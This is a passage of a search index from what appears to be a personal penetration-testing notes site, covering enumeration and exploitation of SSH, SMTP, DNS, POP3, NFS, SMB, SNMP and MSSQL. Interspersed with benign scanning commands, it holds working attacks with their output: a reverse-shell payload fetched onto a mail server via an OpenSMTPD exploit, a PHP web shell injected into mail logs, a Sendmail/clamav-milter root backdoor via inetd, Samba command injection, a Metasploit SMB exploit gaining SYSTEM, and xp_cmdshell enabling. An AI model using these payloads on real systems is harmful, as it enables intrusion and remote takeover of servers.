ssh-keyscan -t rsa $ip >> ~/.ssh/known_hosts Run commands remotely ssh root@ $ip \"id\" Set up ssh Public-private key pairs are located in the ~/.ssh/ directory ssh-keygen -t rsa ssh configuration file etc/ssh/sshd_conf ssh-copy-id command will read the public key from ~/.ssh/id_rsa.pub and adds it to ~/.ssh/authorized_keys on the targetserver ssh-copy-id -i ~/.ssh/id_rsa.pub user@targetserver Using ssh chmod 600 id_rsa ssh -i id_rsa root@ $ip sshpass pass ssh root@ $ip","title":"22 ssh"},{"location":"red-teaming/network-pentest/common-services/00022-ssh/#ssh-22","text":"","title":"ssh 22"},{"location":"red-teaming/network-pentest/common-services/00022-ssh/#target-hosts-fingerprint","text":"Adding (whitelisting) the target host\u2019s fingerprint ssh-keyscan -t rsa $ip >> ~/.ssh/known_hosts","title":"Target host\u2019s fingerprint"},{"location":"red-teaming/network-pentest/common-services/00022-ssh/#run-commands-remotely","text":"ssh root@ $ip \"id\"","title":"Run commands remotely"},{"location":"red-teaming/network-pentest/common-services/00022-ssh/#set-up-ssh","text":"Public-private key pairs are located in the ~/.ssh/ directory ssh-keygen -t rsa ssh configuration file etc/ssh/sshd_conf ssh-copy-id command will read the public key from ~/.ssh/id_rsa.pub and adds it to ~/.ssh/authorized_keys on the targetserver ssh-copy-id -i ~/.ssh/id_rsa.pub user@targetserver","title":"Set up ssh"},{"location":"red-teaming/network-pentest/common-services/00022-ssh/#using-ssh","text":"chmod 600 id_rsa ssh -i id_rsa root@ $ip sshpass pass ssh root@ $ip","title":"Using ssh"},{"location":"red-teaming/network-pentest/common-services/00025-smtp/","text":"smtp 25 What is SMTP? Server Connection $ nc -nvC $ip 25 $ telnet $ip 25 VRFY root EXPN SMTP Commands $ helo admin $ mail from:<> $ rcpt to:<nobody> $ data hades . Scanning Vul $ nmap $ip -p 25 --script = smtp-* $ sudo msfconsole -q -x \"setg RHOSTS $ip ; use auxiliary/scanner/smtp/smtp_enum; run; use auxiliary/scanner/smtp/smtp_relay; run; use auxiliary/scanner/smtp/smtp_version; run; exit\" Scripting Scripting smtp-vrfy.py python3 smtp-vrfy.py <username> #!/usr/bin/python3 import socket import sys if len ( sys . argv ) != 2 : print ( \"Usage: python3 sys.argv[0] <username>\" ) sys . exit ( 0 ) s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) connect = s . connect (( '192.168.11.131' , 25 )) banner = s . recv ( 1024 ) print ( banner ) s . send ( 'VRFY ' + sys . argv [ 1 ] + ' \\r\\n ' ) result = s . recv ( 1024 ) print ( result ) s . close () OpenSMTPD < 6.6.1 - rce https://www.exploit-db.com/exploits/47984 msfvenom -p linux/x86/shell_reverse_tcp LHOST = ip LPORT = 25 -f elf > shell.elf sudo python3 -m http.server 80 python3 47984 .py ip 25 'curl ip/shell.elf -o /tmp/shell' python3 47984 .py ip 25 'chmod +x /tmp/shell' python3 47984 .py ip 25 '/tmp/shell' sudo nc -nvlp 25 listening on [ any ] 25 ... connect to [ ip ] from ( UNKNOWN ) [ ip ] 57356 id uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) LFI to rce WINTERMUTE: 1 - Walkthrough ==> Postfix mail log: /var/log/mail.log $ nc -nC ip 25 220 straylight ESMTP Postfix ( Debian/GNU ) mail from: \"hades <?php system( $_GET ['cmd']); ?> hades\" 250 2 .1.0 Ok rcpt to: \"root@localhost\" 250 2 .1.5 Ok data 354 End data with <CR><LF>.<CR><LF> . 250 2 .0.0 Ok: queued as D4E985515 quit 221 2 .0.0 Bye Postfix SMTP 4.2.x < 4.2.48 - 'Shellshock' https://www.exploit-db.com/exploits/34896 ClamAV Milter 0.92.2 https://www.exploit-db.com/exploits/4761 perl 4761 .pl ip Sendmail w/ clamav-milter Remote Root Exploit Copyright ( C ) 2007 Eliteboy Attacking ip... 220 localhost.localdomain ESMTP Sendmail 8 .13.4/8.13.4/Debian-3sarge3 ; Mon, 26 Jul 2021 09 :42:48 -0400 ; ( No UCE/UBE ) logging access from: [ ip ]( FAIL ) -ip ] 250 -localhost.localdomain Hello [ ip ] , pleased to meet you 250 -ENHANCEDSTATUSCODES 250 -PIPELINING 250 -EXPN 250 -VERB 250 -8BITMIME 250 -SIZE 250 -DSN 250 -ETRN 250 -DELIVERBY 250 HELP 250 2 .1.0 <>... Sender ok 250 2 .1.5 <nobody+ \"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf\" >... Recipient ok 250 2 .1.5 <nobody+ \"|/etc/init.d/inetd restart\" >... Recipient ok 354 Enter mail, end with \".\" on a line by itself 250 2 .0.0 16QDgmnb004808 Message accepted for delivery 221 2 .0.0 localhost.localdomain closing connection $ nc -nv ip 31337 ( UNKNOWN ) [ ip ] 31337 ( ? ) open id uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root )","title":"25 smtp"},{"location":"red-teaming/network-pentest/common-services/00025-smtp/#smtp-25","text":"","title":"smtp 25"},{"location":"red-teaming/network-pentest/common-services/00025-smtp/#what-is-smtp","text":"","title":"What is SMTP?"},{"location":"red-teaming/network-pentest/common-services/00025-smtp/#server-connection","text":"$ nc -nvC $ip 25 $ telnet $ip 25 VRFY root EXPN","title":"Server Connection"},{"location":"red-teaming/network-pentest/common-services/00025-smtp/#smtp-commands","text":"$ helo admin $ mail from:<> $ rcpt to:<nobody> $ data hades .","title":"SMTP Commands"},{"location":"red-teaming/network-pentest/common-services/00025-smtp/#scanning-vul","text":"$ nmap $ip -p 25 --script = smtp-* $ sudo msfconsole -q -x \"setg RHOSTS $ip ; use auxiliary/scanner/smtp/smtp_enum; run; use auxiliary/scanner/smtp/smtp_relay; run; use auxiliary/scanner/smtp/smtp_version; run; exit\"","title":"Scanning Vul"},{"location":"red-teaming/network-pentest/common-services/00025-smtp/#scripting","text":"Scripting smtp-vrfy.py python3 smtp-vrfy.py <username> #!/usr/bin/python3 import socket import sys if len ( sys . argv ) != 2 : print ( \"Usage: python3 sys.argv[0] <username>\" ) sys . exit ( 0 ) s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) connect = s . connect (( '192.168.11.131' , 25 )) banner = s . recv ( 1024 ) print ( banner ) s . send ( 'VRFY ' + sys . argv [ 1 ] + ' \\r\\n ' ) result = s . recv ( 1024 ) print ( result ) s . close ()","title":"Scripting"},{"location":"red-teaming/network-pentest/common-services/00025-smtp/#opensmtpd-661-rce","text":"https://www.exploit-db.com/exploits/47984 msfvenom -p linux/x86/shell_reverse_tcp LHOST = ip LPORT = 25 -f elf > shell.elf sudo python3 -m http.server 80 python3 47984 .py ip 25 'curl ip/shell.elf -o /tmp/shell' python3 47984 .py ip 25 'chmod +x /tmp/shell' python3 47984 .py ip 25 '/tmp/shell' sudo nc -nvlp 25 listening on [ any ] 25 ... connect to [ ip ] from ( UNKNOWN ) [ ip ] 57356 id uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root )","title":"OpenSMTPD &lt; 6.6.1 - rce"},{"location":"red-teaming/network-pentest/common-services/00025-smtp/#lfi-to-rce","text":"WINTERMUTE: 1 - Walkthrough ==> Postfix mail log: /var/log/mail.log $ nc -nC ip 25 220 straylight ESMTP Postfix ( Debian/GNU ) mail from: \"hades <?php system( $_GET ['cmd']); ?> hades\" 250 2 .1.0 Ok rcpt to: \"root@localhost\" 250 2 .1.5 Ok data 354 End data with <CR><LF>.<CR><LF> . 250 2 .0.0 Ok: queued as D4E985515 quit 221 2 .0.0 Bye","title":"LFI to rce"},{"location":"red-teaming/network-pentest/common-services/00025-smtp/#postfix-smtp-42x-4248-shellshock","text":"https://www.exploit-db.com/exploits/34896","title":"Postfix SMTP 4.2.x &lt; 4.2.48 - 'Shellshock'"},{"location":"red-teaming/network-pentest/common-services/00025-smtp/#clamav-milter-0922","text":"https://www.exploit-db.com/exploits/4761 perl 4761 .pl ip Sendmail w/ clamav-milter Remote Root Exploit Copyright ( C ) 2007 Eliteboy Attacking ip... 220 localhost.localdomain ESMTP Sendmail 8 .13.4/8.13.4/Debian-3sarge3 ; Mon, 26 Jul 2021 09 :42:48 -0400 ; ( No UCE/UBE ) logging access from: [ ip ]( FAIL ) -ip ] 250 -localhost.localdomain Hello [ ip ] , pleased to meet you 250 -ENHANCEDSTATUSCODES 250 -PIPELINING 250 -EXPN 250 -VERB 250 -8BITMIME 250 -SIZE 250 -DSN 250 -ETRN 250 -DELIVERBY 250 HELP 250 2 .1.0 <>... Sender ok 250 2 .1.5 <nobody+ \"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf\" >... Recipient ok 250 2 .1.5 <nobody+ \"|/etc/init.d/inetd restart\" >... Recipient ok 354 Enter mail, end with \".\" on a line by itself 250 2 .0.0 16QDgmnb004808 Message accepted for delivery 221 2 .0.0 localhost.localdomain closing connection $ nc -nv ip 31337 ( UNKNOWN ) [ ip ] 31337 ( ? ) open id uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root )","title":"ClamAV Milter 0.92.2"},{"location":"red-teaming/network-pentest/common-services/00053-dns/","text":"DNS 53 Reference Ip address nslookup nslookup > SERVER <IP_DNS> #Select dns server > 127 .0.0.1 #Reverse lookup of 127.0.0.1, maybe... > <IP_MACHINE> #Reverse lookup of a machine, maybe... nmap nmap -n --script \"(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport\" <IP> dig dig axfr cronos.htb @10.10.10.13 dig ANY @<DNS_IP> <DOMAIN> #Any information dig A @<DNS_IP> <DOMAIN> #Regular DNS request dig AAAA @<DNS_IP> <DOMAIN> #IPv6 DNS request dig TXT @<DNS_IP> <DOMAIN> #Information dig MX @<DNS_IP> <DOMAIN> #Emails related dig NS @<DNS_IP> <DOMAIN> #DNS that resolves that name dig -x 192 .168.0.2 @<DNS_IP> #Reverse lookup dig -x 2a00:1450:400c:c06::93 @<DNS_IP> #reverse IPv6 lookup #Use [-p PORT] or -6 (to use ivp6 address of dns) Enum Domain host Options Decription NS Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain. A Also known as a host record, the \"a record\" contains the IP address of a hostname (such as mail.leecybersec.com). MX Mail Exchange records contain the names of the servers responsible for handling email for the domain. A domain can contain multiple MX records. PTR PointerRecords are used in reverse lookup zones and are used to find the records associated with an IP address. CNAME Canonical Name Records are used to create aliases for other host records. TXT Text records can contain any arbitrary data and can be used for various purposes, such as domain ownership verification. Using options host -t txt mail.leecybersec.com whois whois leecybersec.com nslookup nslookup leecybersec.com DNSRecon dnsrecon -d leecybersec.com -t axfr dnsrecon -d leecybersec.com -D ~/list-subdomain.txt -t brt DNSenum dnsenum leecybersec.com DNS Zone Transfer nmap --script = dns-zone-transfer -p 53 leecybersec.com Using zone transfer host -l leecybersec.com ns2.leecybersec.com #!/bin/bash if [ -z \" $1 \" ] ; then echo \"[*] Simple Zone transfer script\" echo \"[*] Usage : $0 <domain name> \" exit 0 fi for server in $( host -t ns $1 | cut -d \" \" -f4 ) ; do host -l $1 $server | grep \"has address\" done","title":"53 dns"},{"location":"red-teaming/network-pentest/common-services/00053-dns/#dns-53","text":"","title":"DNS 53"},{"location":"red-teaming/network-pentest/common-services/00053-dns/#reference","text":"","title":"Reference"},{"location":"red-teaming/network-pentest/common-services/00053-dns/#ip-address","text":"","title":"Ip address"},{"location":"red-teaming/network-pentest/common-services/00053-dns/#nslookup","text":"nslookup > SERVER <IP_DNS> #Select dns server > 127 .0.0.1 #Reverse lookup of 127.0.0.1, maybe... > <IP_MACHINE> #Reverse lookup of a machine, maybe...","title":"nslookup"},{"location":"red-teaming/network-pentest/common-services/00053-dns/#nmap","text":"nmap -n --script \"(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport\" <IP>","title":"nmap"},{"location":"red-teaming/network-pentest/common-services/00053-dns/#dig","text":"dig axfr cronos.htb @10.10.10.13 dig ANY @<DNS_IP> <DOMAIN> #Any information dig A @<DNS_IP> <DOMAIN> #Regular DNS request dig AAAA @<DNS_IP> <DOMAIN> #IPv6 DNS request dig TXT @<DNS_IP> <DOMAIN> #Information dig MX @<DNS_IP> <DOMAIN> #Emails related dig NS @<DNS_IP> <DOMAIN> #DNS that resolves that name dig -x 192 .168.0.2 @<DNS_IP> #Reverse lookup dig -x 2a00:1450:400c:c06::93 @<DNS_IP> #reverse IPv6 lookup #Use [-p PORT] or -6 (to use ivp6 address of dns)","title":"dig"},{"location":"red-teaming/network-pentest/common-services/00053-dns/#enum-domain","text":"","title":"Enum Domain"},{"location":"red-teaming/network-pentest/common-services/00053-dns/#host","text":"Options Decription NS Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain. A Also known as a host record, the \"a record\" contains the IP address of a hostname (such as mail.leecybersec.com). MX Mail Exchange records contain the names of the servers responsible for handling email for the domain. A domain can contain multiple MX records. PTR PointerRecords are used in reverse lookup zones and are used to find the records associated with an IP address. CNAME Canonical Name Records are used to create aliases for other host records. TXT Text records can contain any arbitrary data and can be used for various purposes, such as domain ownership verification. Using options host -t txt mail.leecybersec.com","title":"host"},{"location":"red-teaming/network-pentest/common-services/00053-dns/#whois","text":"whois leecybersec.com","title":"whois"},{"location":"red-teaming/network-pentest/common-services/00053-dns/#nslookup_1","text":"nslookup leecybersec.com","title":"nslookup"},{"location":"red-teaming/network-pentest/common-services/00053-dns/#dnsrecon","text":"dnsrecon -d leecybersec.com -t axfr dnsrecon -d leecybersec.com -D ~/list-subdomain.txt -t brt","title":"DNSRecon"},{"location":"red-teaming/network-pentest/common-services/00053-dns/#dnsenum","text":"dnsenum leecybersec.com","title":"DNSenum"},{"location":"red-teaming/network-pentest/common-services/00053-dns/#dns-zone-transfer","text":"nmap --script = dns-zone-transfer -p 53 leecybersec.com","title":"DNS Zone Transfer"},{"location":"red-teaming/network-pentest/common-services/00053-dns/#using-zone-transfer","text":"host -l leecybersec.com ns2.leecybersec.com #!/bin/bash if [ -z \" $1 \" ] ; then echo \"[*] Simple Zone transfer script\" echo \"[*] Usage : $0 <domain name> \" exit 0 fi for server in $( host -t ns $1 | cut -d \" \" -f4 ) ; do host -l $1 $server | grep \"has address\" done","title":"Using zone transfer"},{"location":"red-teaming/network-pentest/common-services/00110-pop3/","text":"pop3 110 Server Connection \u250c\u2500\u2500 ( Hades\u327f192.168.11.140 ) - [ 3 .1:21.8 ] ~ \u2514\u2500$ nc -nC $ip 110 +OK solidstate POP3 server ( JAMES POP3 Server 2 .3.2 ) ready user john +OK pass 123456 +OK Welcome john list +OK 1 743 1 743 . retr 1 +OK Message follows Return-Path: <mailadmin@localhost> <Message> . quit +OK Apache James POP3 Server signing off. Thunderbird Mail sudo apt install thunderbird","title":"110 pop3"},{"location":"red-teaming/network-pentest/common-services/00110-pop3/#pop3-110","text":"","title":"pop3 110"},{"location":"red-teaming/network-pentest/common-services/00110-pop3/#server-connection","text":"\u250c\u2500\u2500 ( Hades\u327f192.168.11.140 ) - [ 3 .1:21.8 ] ~ \u2514\u2500$ nc -nC $ip 110 +OK solidstate POP3 server ( JAMES POP3 Server 2 .3.2 ) ready user john +OK pass 123456 +OK Welcome john list +OK 1 743 1 743 . retr 1 +OK Message follows Return-Path: <mailadmin@localhost> <Message> . quit +OK Apache James POP3 Server signing off.","title":"Server Connection"},{"location":"red-teaming/network-pentest/common-services/00110-pop3/#thunderbird-mail","text":"sudo apt install thunderbird","title":"Thunderbird Mail"},{"location":"red-teaming/network-pentest/common-services/00111-nfs/","text":"nfs 111 Find services nmap -sV -p 111 --script = rpcinfo $ip NFS NSE Scripts nmap -p 111 --script nfs* $ip Mount sudo mount -o nolock 192 .168.11.131:/share ~/share","title":"111 nfs"},{"location":"red-teaming/network-pentest/common-services/00111-nfs/#nfs-111","text":"","title":"nfs 111"},{"location":"red-teaming/network-pentest/common-services/00111-nfs/#find-services","text":"nmap -sV -p 111 --script = rpcinfo $ip","title":"Find services"},{"location":"red-teaming/network-pentest/common-services/00111-nfs/#nfs-nse-scripts","text":"nmap -p 111 --script nfs* $ip","title":"NFS NSE Scripts"},{"location":"red-teaming/network-pentest/common-services/00111-nfs/#mount","text":"sudo mount -o nolock 192 .168.11.131:/share ~/share","title":"Mount"},{"location":"red-teaming/network-pentest/common-services/00139-445-smb/","text":"smb 139,445 SMB Enumeration Guess Server's Version nmap -p 139 ,445 $ip --script = smb-os-discovery Detect Server's version using nmap features. nmap -A 10 .10.10.4 Scanning smbclient smbclient -NL //ip smbclient -L ip --port = 445 --user = Administrator smbmap smbmap -H $ip smbmap -u <user> -H $ip Scanning Vul nmap -p 139 ,445 --script smb-vul* $ip Other Tools NetBIOS information nbtscan -r $ip enum4linux enum4linux -a $ip rpcclient rpcclient -U \"\" $ip Connect to SMB smbclient smbclient //ip/folder smbclient \\\\\\\\ ip \\\\ folder -U john smbmap smbmap -H 192 .168.11.135 -u windows_10_1903_x64 -p passwd -r 'Users\\windows_10_1903_x64\\Desktop' Mount Access sudo mount -t cifs -o user = USERNAME,sec = ntlm,dir_mode = 0077 \"//ip/My Share\" /mnt/cifs sudo mount -t cifs -o username = Administrator,password = 123456 /mnt/win10_share -o port = 445 //ip/Data sudo mount -o nolock $ip :/home ~/home/ Windows \\\\ ip \\a\\w hoami.exe SMB Commands srvinfo enumdomusers getdompwinfo querydominfo netshareenum netshareenumall Config Samba /etc/samba/smb.conf min protocol = SMB1 SMB CVE Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' https://www.exploit-db.com/exploits/16320 smbmap -u '/=`ping -c 2 ip`' -H ip smb-vuln-cve2009-3103 Using python exploit but not complete, exploit here ExploitDB: https://www.exploit-db.com/exploits/40280 $ python3 MS09_050.py ip Enter WORKGROUP \\A dministrator ' s password: Cannot connect to server. Error was NT_STATUS_LOGON_FAILURE $ sudo msfconsole -q use exploit/multi/handler set lhost tun0 set lport 445 set EXITFUNC thread run Using msfconsole msf6 exploit ( windows/smb/ms09_050_smb2_negotiate_func_index ) > show options Module options ( exploit/windows/smb/ms09_050_smb2_negotiate_func_index ) : Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS ip yes The target host ( s ) , range CIDR identifier, or hosts file with syntax 'file:<path>' RPORT 445 yes The target port ( TCP ) WAIT 180 yes The number of seconds to wait for the attack to complete. Payload options ( windows/meterpreter/reverse_tcp ) : Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique ( Accepted: '' , seh, thread, process, none ) LHOST tun0 yes The listen address ( an interface may be specified ) LPORT 445 yes The listen port Exploit target: Id Name -- ---- 0 Windows Vista SP1/SP2 and Server 2008 ( x86 ) msf6 exploit ( windows/smb/ms09_050_smb2_negotiate_func_index ) > run [ * ] Started reverse TCP handler on ip [ * ] ip:445 - Connecting to the target ( ip:445 ) ... [ * ] ip:445 - Sending the exploit packet ( 951 bytes ) ... [ * ] ip:445 - Waiting up to 180 seconds for exploit to trigger... [ * ] Sending stage ( 175174 bytes ) to ip [ * ] Meterpreter session 2 opened ( ip:445 -> ip:49159 ) at 2021 -07-06 23 :40:40 +0700 meterpreter > getuid Server username: NT AUTHORITY \\S YSTEM","title":"139,445 smb"},{"location":"red-teaming/network-pentest/common-services/00139-445-smb/#smb-139445","text":"","title":"smb 139,445"},{"location":"red-teaming/network-pentest/common-services/00139-445-smb/#smb-enumeration","text":"","title":"SMB Enumeration"},{"location":"red-teaming/network-pentest/common-services/00139-445-smb/#guess-servers-version","text":"nmap -p 139 ,445 $ip --script = smb-os-discovery Detect Server's version using nmap features. nmap -A 10 .10.10.4","title":"Guess Server's Version"},{"location":"red-teaming/network-pentest/common-services/00139-445-smb/#scanning","text":"smbclient smbclient -NL //ip smbclient -L ip --port = 445 --user = Administrator smbmap smbmap -H $ip smbmap -u <user> -H $ip","title":"Scanning"},{"location":"red-teaming/network-pentest/common-services/00139-445-smb/#scanning-vul","text":"nmap -p 139 ,445 --script smb-vul* $ip","title":"Scanning Vul"},{"location":"red-teaming/network-pentest/common-services/00139-445-smb/#other-tools","text":"NetBIOS information nbtscan -r $ip enum4linux enum4linux -a $ip rpcclient rpcclient -U \"\" $ip","title":"Other Tools"},{"location":"red-teaming/network-pentest/common-services/00139-445-smb/#connect-to-smb","text":"","title":"Connect to SMB"},{"location":"red-teaming/network-pentest/common-services/00139-445-smb/#smbclient","text":"smbclient //ip/folder smbclient \\\\\\\\ ip \\\\ folder -U john","title":"smbclient"},{"location":"red-teaming/network-pentest/common-services/00139-445-smb/#smbmap","text":"smbmap -H 192 .168.11.135 -u windows_10_1903_x64 -p passwd -r 'Users\\windows_10_1903_x64\\Desktop'","title":"smbmap"},{"location":"red-teaming/network-pentest/common-services/00139-445-smb/#mount-access","text":"sudo mount -t cifs -o user = USERNAME,sec = ntlm,dir_mode = 0077 \"//ip/My Share\" /mnt/cifs sudo mount -t cifs -o username = Administrator,password = 123456 /mnt/win10_share -o port = 445 //ip/Data sudo mount -o nolock $ip :/home ~/home/","title":"Mount Access"},{"location":"red-teaming/network-pentest/common-services/00139-445-smb/#windows","text":"\\\\ ip \\a\\w hoami.exe","title":"Windows"},{"location":"red-teaming/network-pentest/common-services/00139-445-smb/#smb-commands","text":"srvinfo enumdomusers getdompwinfo querydominfo netshareenum netshareenumall","title":"SMB Commands"},{"location":"red-teaming/network-pentest/common-services/00139-445-smb/#config-samba","text":"/etc/samba/smb.conf min protocol = SMB1","title":"Config Samba"},{"location":"red-teaming/network-pentest/common-services/00139-445-smb/#smb-cve","text":"","title":"SMB CVE"},{"location":"red-teaming/network-pentest/common-services/00139-445-smb/#samba-3020-3025rc3-username-map-script","text":"https://www.exploit-db.com/exploits/16320 smbmap -u '/=`ping -c 2 ip`' -H ip","title":"Samba 3.0.20 &lt; 3.0.25rc3 - 'Username' map script'"},{"location":"red-teaming/network-pentest/common-services/00139-445-smb/#smb-vuln-cve2009-3103","text":"Using python exploit but not complete, exploit here ExploitDB: https://www.exploit-db.com/exploits/40280 $ python3 MS09_050.py ip Enter WORKGROUP \\A dministrator ' s password: Cannot connect to server. Error was NT_STATUS_LOGON_FAILURE $ sudo msfconsole -q use exploit/multi/handler set lhost tun0 set lport 445 set EXITFUNC thread run Using msfconsole msf6 exploit ( windows/smb/ms09_050_smb2_negotiate_func_index ) > show options Module options ( exploit/windows/smb/ms09_050_smb2_negotiate_func_index ) : Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS ip yes The target host ( s ) , range CIDR identifier, or hosts file with syntax 'file:<path>' RPORT 445 yes The target port ( TCP ) WAIT 180 yes The number of seconds to wait for the attack to complete. Payload options ( windows/meterpreter/reverse_tcp ) : Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique ( Accepted: '' , seh, thread, process, none ) LHOST tun0 yes The listen address ( an interface may be specified ) LPORT 445 yes The listen port Exploit target: Id Name -- ---- 0 Windows Vista SP1/SP2 and Server 2008 ( x86 ) msf6 exploit ( windows/smb/ms09_050_smb2_negotiate_func_index ) > run [ * ] Started reverse TCP handler on ip [ * ] ip:445 - Connecting to the target ( ip:445 ) ... [ * ] ip:445 - Sending the exploit packet ( 951 bytes ) ... [ * ] ip:445 - Waiting up to 180 seconds for exploit to trigger... [ * ] Sending stage ( 175174 bytes ) to ip [ * ] Meterpreter session 2 opened ( ip:445 -> ip:49159 ) at 2021 -07-06 23 :40:40 +0700 meterpreter > getuid Server username: NT AUTHORITY \\S YSTEM","title":"smb-vuln-cve2009-3103"},{"location":"red-teaming/network-pentest/common-services/00161-199-snmp/","text":"snmp 161 Scanning sudo nmap -sU --open -p 161 $ip snmp-check $ip -p 199 # 161 Entire MIB Tree Script https://github.com/dheiland-r7/snmp $ ./snmpbw.pl 10 .10.10.241 public 2 1 SNMP query: 10 .10.10.241 Queue count: 0 SNMP SUCCESS: 10 .10.10.241 Manual File list_community : public private manager onesixtyone -c list_community -i list_ip snmpwalk -c public -v1 -t 10 $ip Options Numbers User Accounts snmpwalk -c public -v1 $ip 1.3.6.1.4.1.77.1.2.25 Running Programs snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.4.2.1.2 Open TCP Ports snmpwalk -c public -v1 $ip 1.3.6.1.2.1.6.13.1.3 Installed Software snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.6.3.1.2 System Processes snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.1.6.0 Processes Path snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.4.2.1.4 Storage Units snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.2.3.1.4","title":"161,199 snmp"},{"location":"red-teaming/network-pentest/common-services/00161-199-snmp/#snmp-161","text":"","title":"snmp 161"},{"location":"red-teaming/network-pentest/common-services/00161-199-snmp/#scanning","text":"sudo nmap -sU --open -p 161 $ip snmp-check $ip -p 199 # 161","title":"Scanning"},{"location":"red-teaming/network-pentest/common-services/00161-199-snmp/#entire-mib-tree","text":"","title":"Entire MIB Tree"},{"location":"red-teaming/network-pentest/common-services/00161-199-snmp/#script","text":"https://github.com/dheiland-r7/snmp $ ./snmpbw.pl 10 .10.10.241 public 2 1 SNMP query: 10 .10.10.241 Queue count: 0 SNMP SUCCESS: 10 .10.10.241","title":"Script"},{"location":"red-teaming/network-pentest/common-services/00161-199-snmp/#manual","text":"File list_community : public private manager onesixtyone -c list_community -i list_ip snmpwalk -c public -v1 -t 10 $ip Options Numbers User Accounts snmpwalk -c public -v1 $ip 1.3.6.1.4.1.77.1.2.25 Running Programs snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.4.2.1.2 Open TCP Ports snmpwalk -c public -v1 $ip 1.3.6.1.2.1.6.13.1.3 Installed Software snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.6.3.1.2 System Processes snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.1.6.0 Processes Path snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.4.2.1.4 Storage Units snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.2.3.1.4","title":"Manual"},{"location":"red-teaming/network-pentest/common-services/01443-mssql/","text":"MSSQL Broute Force File ms-sql-brute nmap -p 1433 --script ms-sql-brute --script-args userdb = customuser.txt,passdb = custompass.txt <host> Connection Add server $ cat /etc/freetds/freetds.conf <snip> [ Pentest ] host = <ip> port = 1433 Stored password $ cat ~/.sqshrc \\s et username = sa \\s et password = PASSWORD \\s et style = vert $ sqsh -S Pentest 1 > Normal Connection $ sqsh -S mssql -U sa sqsh-2.5.16.1 Copyright ( C ) 1995 -2001 Scott C. Gray Portions Copyright ( C ) 2004 -2014 Michael Peppler and Martin Wesdorp This is free software with ABSOLUTELY NO WARRANTY For more information type '\\warranty' Password: 1 > \\s et style = vert 1 > Execute commands Advanced Option 1 > EXEC sp_configure 'show advanced option' ; 2 > go name: show advanced options minimum: 0 maximum: 1 config_value: 0 run_value: 0 ( return status = 0 ) Config xp_cmdshell 1 > EXEC sp_configure 'show advanced option' , '1' ; 2 > go Configuration option 'show advanced options' changed from 1 to 1 . Run the RECONFIGURE statement to install. ( return status = 0 ) 1 > RECONFIGURE WITH OVERRIDE ; 2 > go 1 > EXEC sp_configure 'xp_cmdshell' , 1 ; 2 > go Configuration option 'xp_cmdshell' changed from 1 to 1 . Run the RECONFIGURE statement to install. ( return status = 0 ) 1 > RECONFIGURE ; 2 > go === Recheck === 1 > EXEC sp_configure 'show advanced option' ; 2 > go name: show advanced options minimum: 0 maximum: 1 config_value: 1 run_value: 1 ( return status = 0 ) ------ Execute commands 1 > xp_cmdshell 'whoami' ; 2 > go output: nt service \\m ssql $sqlexpress output: NULL ( 2 rows affected, return status = 0 )","title":"1443 mssql"},{"location":"red-teaming/network-pentest/common-services/01443-mssql/#mssql","text":"","title":"MSSQL"},{"location":"red-teaming/network-pentest/common-services/01443-mssql/#broute-force","text":"","title":"Broute Force"},{"location":"red-teaming/network-pentest/common-services/01443-mssql/#file-ms-sql-brute","text":"nmap -p 1433 --script ms-sql-brute --script-args userdb = customuser.txt,passdb = custompass.txt <host>","title":"File ms-sql-brute"},{"location":"red-teaming/network-pentest/common-services/01443-mssql/#connection","text":"","title":"Connection"},{"location":"red-teaming/network-pentest/common-services/01443-mssql/#add-server","text":"$ cat /etc/freetds/freetds.conf <snip> [ Pentest ] host = <ip> port = 1433","title":"Add server"},{"location":"red-teaming/network-pentest/common-services/01443-mssql/#stored-password","text":"$ cat ~/.sqshrc \\s et username = sa \\s et password = PASSWORD \\s et style = vert $ sqsh -S Pentest 1 >","title":"Stored password"},{"location":"red-teaming/network-pentest/common-services/01443-mssql/#normal-connection","text":"$ sqsh -S mssql -U sa sqsh-2.5.16.1 Copyright ( C ) 1995 -2001 Scott C. Gray Portions Copyright ( C ) 2004 -2014 Michael Peppler and Martin Wesdorp This is free software with ABSOLUTELY NO WARRANTY For more information type '\\warranty' Password: 1 > \\s et style = vert 1 >","title":"Normal Connection"},{"location":"red-teaming/network-pentest/common-services/01443-mssql/#execute-commands","text":"","title":"Execute commands"},{"location":"red-teaming/network-pentest/common-services/01443-mssql/#advanced-option","text":"1 > EXEC sp_configure 'show advanced option' ; 2 > go name: show advanced options minimum: 0 maximum: 1 config_value: 0 run_value: 0 ( return status = 0 )","title":"Advanced Option"},{"location":"red-teaming/network-pentest/common-services/01443-mssql/#config-xp_cmdshell","text":"1 > EXEC sp_configure 'show advanced option' , '1' ; 2 > go Configuration option 'show advanced options' changed from 1 to 1 . Run the RECONFIGURE statement to install. ( return status = 0 ) 1 > RECONFIGURE WITH OVERRIDE ; 2 > go 1 > EXEC sp_configure 'xp_cmdshell' , 1 ; 2 > go Configuration option 'xp_cmdshell' changed from 1 to 1 . Run the RECONFIGURE statement to install. ( return status = 0 ) 1 > RECONFIGURE ; 2 > go === Recheck === 1 > EXEC sp_configure 'show advanced option' ; 2 > go name: show advanced options minimum: 0 maximum: 1 config_value: 1 run_value: 1 ( 